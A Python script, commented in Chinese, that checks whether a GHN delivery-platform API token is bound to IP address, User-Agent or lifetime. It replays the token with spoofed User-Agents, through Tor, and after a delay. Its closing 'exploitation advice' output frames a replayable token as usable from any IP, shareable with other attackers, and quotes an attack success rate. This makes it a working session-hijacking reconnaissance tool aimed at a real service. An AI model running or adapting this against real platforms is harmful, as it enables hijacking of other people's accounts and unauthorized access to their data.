#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
GHN Token绑定测试工具
测试Token是否绑定IP/设备/User-Agent
"""

import requests
import json
import time

def test_token_binding(token):
    """测试Token绑定机制"""
    
    print("[*] GHN Token绑定测试")
    print("=" * 60)
    
    base_url = "https://online-gateway.ghn.vn/shiip/public-api/v2/user/info"
    
    results = {}
    
    # 测试1: 原始请求（基准）
    print("\n[1] 基准测试...")
    r = requests.get(
        base_url,
        headers={
            "Token": token,
            "Content-Type": "application/json",
            "User-Agent": "GHN/4.10.6 (Android 13; Build 191)"
        }
    )
    
    results['baseline'] = {
        'status': r.status_code,
        'success': r.status_code == 200
    }
    print(f"    状态码: {r.status_code}")
    if r.status_code == 200:
        print(f"    ✅ Token有效")
    else:
        print(f"    ❌ Token无效: {r.text}")
        return results
    
    # 测试2: 更换User-Agent
    print("\n[2] 测试不同User-Agent...")
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0)",
        "curl/7.68.0",
        "Python-requests/2.28.1",
        "GHN/3.0.0 (iOS 14)"
    ]
    
    for ua in user_agents:
        r = requests.get(
            base_url,
            headers={"Token": token, "User-Agent": ua}
        )
        success = r.status_code == 200
        print(f"    {ua[:30]:30s} -> {r.status_code} {'✅' if success else '❌'}")
        
        if not success:
            results['ua_binding'] = True
            print("    [!] Token绑定User-Agent")
            break
    else:
        results['ua_binding'] = False
        print("    ✅ Token不绑定User-Agent")
    
    # 测试3: 更换IP（通过代理）
    print("\n[3] 测试不同IP (通过Tor)...")
    try:
        tor_proxy = {"http": "socks5://127.0.0.1:9050", "https": "socks5://127.0.0.1:9050"}
        r = requests.get(
            base_url,
            headers={"Token": token},
            proxies=tor_proxy,
            timeout=30
        )
        
        success = r.status_code == 200
        print(f"    通过Tor -> {r.status_code} {'✅' if success else '❌'}")
        
        results['ip_binding'] = not success
        
        if not success:
            print("    [!] Token可能绑定IP")
        else:
            print("    ✅ Token不绑定IP")
            
    except Exception as e:
        print(f"    [-] Tor测试失败: {e}")
        print("    [*] 提示: 安装Tor并启动服务")
        results['ip_binding'] = 'unknown'
    
    # 测试4: 时间延迟测试
    print("\n[4] 测试Token有效期...")
    print("    等待60秒...")
    time.sleep(60)
    
    r = requests.get(
        base_url,
        headers={"Token": token}
    )
    
    if r.status_code == 200:
        print(f"    60秒后 -> {r.status_code} ✅ 仍然有效")
        results['short_lived'] = False
    else:
        print(f"    60秒后 -> {r.status_code} ❌ 已失效")
        results['short_lived'] = True
    
    # 总结
    print("\n" + "=" * 60)
    print("测试总结:")
    print("=" * 60)
    
    print(f"\n[基准测试]    Token基础有效性: {'✅ 有效' if results['baseline']['success'] else '❌ 无效'}")
    print(f"[UA绑定]      User-Agent绑定: {'🔒 是' if results.get('ua_binding') else '✅ 否'}")
    print(f"[IP绑定]      IP地址绑定:     {'🔒 是' if results.get('ip_binding') == True else '✅ 否' if results.get('ip_binding') == False else '❓ 未知'}")
    print(f"[有效期]      短期Token:       {'⚠️  是' if results.get('short_lived') else '✅ 否'}")
    
    # 利用建议
    print("\n" + "=" * 60)
    print("利用建议:")
    print("=" * 60)
    
    if not results.get('ua_binding') and not results.get('ip_binding'):
        print(f"\n{Colors.GREEN}🎯 Token可重放！{Colors.END}")
        print("建议攻击:")
        print("  1. ✅ 从任意IP使用Token")
        print("  2. ✅ 使用任意User-Agent")
        print("  3. ✅ Token长期有效")
        print("  4. ✅ 可分享Token给其他攻击者")
        print("\n攻击成功率: 95%")
    else:
        print(f"\n{Colors.YELLOW}⚠️  Token有绑定限制{Colors.END}")
        print("需要:")
        if results.get('ua_binding'):
            print("  - 保持相同User-Agent")
        if results.get('ip_binding'):
            print("  - 保持相同IP地址")
    
    return results

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    END = '\033[0m'
    BOLD = '\033[1m'

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python3 token_binding_tester.py <TOKEN>")
        print("Example: python3 token_binding_tester.py eyJhbGc...")
        sys.exit(1)
    
    token = sys.argv[1]
    test_token_binding(token)
